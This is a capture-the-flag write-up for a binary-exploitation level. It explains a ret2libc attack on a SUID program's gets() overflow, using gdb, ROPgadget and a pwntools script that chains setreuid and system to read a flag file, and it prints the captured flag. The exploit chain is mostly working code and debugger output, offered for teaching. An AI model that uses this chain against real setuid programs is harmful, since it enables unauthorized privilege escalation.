# Level 03

## Exploit explanation : ret2libc

This level does not have an executable stack, so we need to use the libc in order to get the flag.

### What is ret2libc

The same way that we used the `ret` instruction to jump to our shellcode, we can use it to jump to some functions in the libc that we may need. Useful functions include `setreuid` to take advantage of the SUID and `system` to execute a command in a subshell.

### How to find it

Similar to `ret2shellcode`, **ret2libc** needs a *buffer overflow* so we can overwrite the `saved rip` of the current function. We also need the libc to be linked to the ELF. We may also have the need for **gadgets**, portions of the ELF that we may use to define registers, or jump to portions of code, and maybe a need to insert data.

In this exercise, we have a pretty obvious buffer overflow :

```c
static void queue_job(void)
{
    char msg[MSG_SIZE]; // Buffer with fixed size here

    if (job_count >= MAX_JOBS) {
        printf("[ARMITAGE] Queue full. Dropping connection.\n");
        exit(1);
    }

    printf("[ARMITAGE] Prove yourself: ");
    fflush(stdout);

    gets(msg); // <--- HERE, unlimited read

    if (!validate_job(msg)) {
        printf("[ARMITAGE] Invalid job format. Expected JOB:<data>\n");
        return;
    }

    job_queue[job_count].id = job_count;
    job_queue[job_count].priority = 1;
    job_queue[job_count].status = 0;
    strncpy(job_queue[job_count].payload, msg + 4, MSG_SIZE - 1);
    job_count++;

    printf("[ARMITAGE] Job %u queued. Priority: %u\n",
        job_count - 1, job_queue[job_count - 1].priority);
}
```

We can confirm that a simple `ret2shellcode` will not work because of the file securities :

```bash
$ checksec ./armitage
[*] '/home/level03/armitage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**NX** being enabled, the stack is not executable. We can't insert a shellcode in the env or the buffer. We can see in the above file that we have the libc thanks to functions like gets or strncpy, but we can check with gdb :

```gdb
(gdb) info proc mappings
process 3608
Mapped address spaces:

          Start Addr           End Addr       Size     Offset  Perms  objfile
      # ...
      0x7ffff7c00000     0x7ffff7c28000    0x28000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7c28000     0x7ffff7db1000   0x189000    0x28000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6
      # ...
[vsyscall]
```

## Exploit application

Let's get some addresses ! First, we need to know the ones of the buffer and the `saved rip` of its function :

```gdb
(gdb) disas queue_job
Dump of assembler code for function queue_job:
    # ...
   0x0000000000401342 <+87>:	mov    %rax,%rdi # <- The buffer is in rax
   0x0000000000401345 <+90>:	call   0x401100 <gets@plt>
    # ...
   0x00000000004013ec <+257>:	mov    $0x7f,%edx
   0x00000000004013f1 <+262>:	mov    %rax,%rsi
   0x00000000004013f4 <+265>:	mov    %rcx,%rdi
   0x00000000004013f7 <+268>:	call   0x4010b0 <strncpy@plt>
    # ...
   0x0000000000401448 <+349>:	leave
   0x0000000000401449 <+350>:	ret
End of assembler dump.
(gdb) b *0x401345
Breakpoint 1 at 0x401345
(gdb) run
Starting program: /home/level03/armitage 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
  [ARMITAGE] I have a job for you, cowboy.
  [ARMITAGE] Transmission channel open.
[ARMITAGE] Prove yourself: 
Breakpoint 1, 0x0000000000401345 in queue_job ()
```

At this point, we know that the buffer is in `rax` :

```gdb
(gdb) info registers rax
rax            0x7fffffffe1c0      140737488347584
```

The buffer is in this address : `0x7fffffffe1c0`

Let's find the `saved rip` :

```gdb
(gdb) info frame
Stack level 0, frame at 0x7fffffffe250:
 rip = 0x401345 in queue_job; saved rip = 0x4014e3
 called by frame at 0x7fffffffe260
 Arglist at 0x7fffffffe240, args: 
 Locals at 0x7fffffffe240, Previous frame's sp is 0x7fffffffe250
 Saved registers:
  rbp at 0x7fffffffe240, rip at 0x7fffffffe248
```

And the saved rip is at : `0x7fffffffe248`, or an offset of `136`. That is `128 + 8 = MSG_SIZE + saved_rbp`, so this works, it being the only local variable !

To find the flag, we will need 2 functions :
- `setreuid` to keep the SUID in the following call
- `system` to cat the file in a subshell

Before all, we need to find a way to give them their arguments. We will use **gadgets**. We need a gadget to `pop` to the first argument register `rdi`, but also one to push to the second argument register `rsi` for `setreuid` :

```bash
$ ROPgadget --binary armitage | grep 'pop rdi ; ret'
$ ROPgadget --binary armitage | grep 'pop rsi ; ret'
```

No luck. Luckily for us, we saw that we also link the libc :

```gdb
(gdb) info proc mappings
process 3814
Mapped address spaces:

          Start Addr           End Addr       Size     Offset  Perms  objfile
    # ...
      0x7ffff7c00000     0x7ffff7c28000    0x28000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7c28000     0x7ffff7db1000   0x189000    0x28000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6
    # ...
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0  --xp   [vsyscall]
```

Two important things : the libc included is `/usr/lib/x86_64-linux-gnu/libc.so.6`, and it is located at the address : `0x7ffff7c00000`. Let's look inside this file for gadgets :

```bash
$ ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rdi ; ret'
0x000000000010c08d : pop rdi ; ret
0x0000000000121422 : pop rdi ; retf
$ ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rsi ; ret'
0x0000000000110b7d : pop rsi ; ret
```

We actually found nice gadgets to set our parameters ! We can verify them, not forgetting to add to this addresses the libc base address :

```gdb
(gdb) x/2i 0x7ffff7d0c08d
   0x7ffff7d0c08d <re_compile_internal+2077>:	pop    %rdi
   0x7ffff7d0c08e <re_compile_internal+2078>:	ret
(gdb) x/2i 0x7ffff7d10b7d
   0x7ffff7d10b7d <eval_expr_multdiv+157>:	pop    %rsi
   0x7ffff7d10b7e <eval_expr_multdiv+158>:	ret
```

Exactly what we want. Now let's find the addresses of `setreuid` and `system` (and `exit` to quit properly, just for swag) :

```gdb
(gdb) p setreuid
$1 = {int (uid_t, uid_t)} 0x7ffff7d27370 <__setreuid>
(gdb) p system
$2 = {int (const char *)} 0x7ffff7c58750 <__libc_system>
(gdb) p exit
$3 = {void (int)} 0x7ffff7c47ba0 <__GI_exit>
```

We now have everything we need, but the buffer being a local variable, it subject to change after the end of the function. Luckily for us, it is copied in a special case to a file-scoped variable :

```c
    if (!validate_job(msg)) {
        printf("[ARMITAGE] Invalid job format. Expected JOB:<data>\n");
        return;
    }

    // ...
    strncpy(job_queue[job_count].payload, msg + 4, MSG_SIZE - 1);
```

We need to find this payload (the validation function just wants us to add "JOB:" at the start of the payload) :

```gdb
(gdb) disas queue_job
Dump of assembler code for function queue_job:
    # ...
    # The dest buffer is in rcx
   0x00000000004013ec <+257>:	mov    $0x7f,%edx
   0x00000000004013f1 <+262>:	mov    %rax,%rsi
   0x00000000004013f4 <+265>:	mov    %rcx,%rdi
   0x00000000004013f7 <+268>:	call   0x4010b0 <strncpy@plt>
    # ...
   0x0000000000401448 <+349>:	leave
   0x0000000000401449 <+350>:	ret
End of assembler dump.
(gdb) b *0x4013f7
Breakpoint 2 at 0x4013f7
(gdb) run
Starting program: /home/level03/armitage 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
  [ARMITAGE] I have a job for you, cowboy.
  [ARMITAGE] Transmission channel open.
[ARMITAGE] Prove yourself: 
JOB:testaaaaaaaaaaaaaaaaaaaaa

Breakpoint 2, 0x00000000004013f7 in queue_job ()
(gdb) info registers rcx
rcx            0x40408c            4210828
(gdb) ni
0x00000000004013fc in queue_job ()
(gdb) x/s 0x40408c
0x40408c <job_queue+12>:	"test", 'a' <repeats 21 times>
```

The payload is now stored in `0x40408c`.

Let's summarize :

| Element | Relative address | Address |
| --- | --- | --- |
| Buffer || 0x7fffffffe1c0 |
| Saved rip || 0x7fffffffe248 |
| Base libc || 0x7ffff7c00000 |
| RDI gadget | 0x10c08d | 0x7ffff7d0c08d |
| RSI gadget | 0x110b7d | 0x7ffff7d10b7d |
| setreuid || 0x7ffff7d27370 |
| system || 0x7ffff7c58750 |
| exit || 0x7ffff7c47ba0 |
| Payload || 0x40408c |

Finally, we just need to know the values to give to `resuid` :

```bash
$ id -u flag03
1020
```

Now we corrupt the stack to place our arguments in the correct order, and we also write in the valid buffer our shell command. The buffer will look like that :
- JOB:cat/home/flag03/.pass
- `\x00` to end the cmd
- `A` padding to complete the offset
- POP_RDI + UID
- POP_RSI + UID
- SETREUID
- POP_RDI + Payload address
- SYSTEM
- EXIT

We write a small Python script to generate our payload :

```python
#!/usr/bin/env python3
# 1-exploit.py

import pwn, struct

pwn.context.arch = 'amd64'
pwn.context.log_level = 'error'

OFFSET = 136

SYSTEM_ADDR = 0x7ffff7c58750
PAYLOAD_ADDR = 0x40408c
SETREUID_ADDR = 0x7ffff7d27370
POP_RDI_ADDR = 0x7ffff7d0c08d
POP_RSI_ADDR = 0x7ffff7d10b7d
EXIT_ADDR = 0x7ffff7c47ba0

UID = 1020
INITIAL_PAYLOAD = b"JOB:cat /home/flag03/.pass\x00"


payload = (
    INITIAL_PAYLOAD
    + b'A' * (OFFSET - len(INITIAL_PAYLOAD))
    + pwn.p64(POP_RDI_ADDR) + pwn.p64(UID)
    + pwn.p64(POP_RSI_ADDR) + pwn.p64(UID)
    + pwn.p64(SETREUID_ADDR)
    + pwn.p64(POP_RDI_ADDR)
    + pwn.p64(PAYLOAD_ADDR)
    + pwn.p64(SYSTEM_ADDR)
    + pwn.p64(EXIT_ADDR)
)

with open("payload", "wb") as f:
    f.write(payload)
```

And finally :

```bash
$ python3 1-exploit.py
$ ./armitage < payload | grep -oE '[[:alnum:]]{32}'
8c33zqo7hytqnsx9h3nb4juf3rdjbd80
```